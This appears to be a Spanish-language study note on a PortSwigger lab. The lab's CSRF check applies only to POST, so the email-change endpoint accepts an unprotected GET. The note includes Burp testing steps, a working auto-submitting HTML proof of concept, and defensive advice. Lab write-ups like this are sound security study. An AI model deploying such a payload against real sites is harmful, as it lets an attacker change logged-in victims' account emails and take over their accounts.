# CSRF-2 - La validación del token depende del método HTTP

Lab: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method

## Idea clave
La app "protege" el cambio de email cuando se usa `POST` (valida token CSRF), pero el mismo cambio de estado también se puede hacer vía `GET` y ahí **no** valida token.

Resultado: si el usuario víctima está logueado, un atacante puede forzar un `GET /my-account/change-email?email=...` desde otro sitio y cambiarle el email.

## Dónde mirar
- Acción típica: "Change email".
- Endpoint: `/my-account/change-email`
- Comparar comportamiento entre métodos:
  - `POST` (con token CSRF).
  - `GET` (misma acción vía query string).

## Cómo identificarlo (pasos en Burp)
1. Logueate como `wiener` y cambia el email normalmente.
2. Intercepta la request y mandala a Repeater.
3. Proba sin token con `POST`:
   - Esperable: falla / error de CSRF.
4. Proba con `GET`:
   - `GET /my-account/change-email?email=test%40example.com`
   - Si el email cambia, el token solo se valida para `POST` (bug del lab).

## Por qué funciona (nota rápida)
- El servidor acepta un método inseguro para cambios de estado (`GET`).
- En muchos escenarios, `SameSite=Lax` permite cookies en navegaciones top-level con `GET`, haciendo que este tipo de CSRF sea especialmente viable.

## PoC (Exploit Server / página atacante)
Reemplaza:
- `https://TARGET_HOST` por el host del lab/objetivo
- `attacker@evil.test` por el email que quieras setear

```html
<html>
  <body>
    <!-- Forzamos un GET que cambia estado (mala práctica del servidor). -->
    <form action="https://TARGET_HOST/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="attacker@evil.test" />
      <input type="submit" value="Submit request" />
    </form>

    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Checklist para resolver el lab
1. Confirmar que `POST` requiere token y falla sin el.
2. Confirmar que `GET` cambia el email sin token.
3. Subir el HTML al exploit server.
4. "Deliver exploit to victim".
5. Verificar que el email de `administrator` se actualizó.

## Notas de defensa (para recordar)
- No aceptar cambios de estado con `GET`.
- Validar CSRF de forma consistente en todos los métodos/rutas que cambian estado.
- Complementar con `SameSite` y validación de `Origin`/`Referer` cuando aplique (no como única defensa).
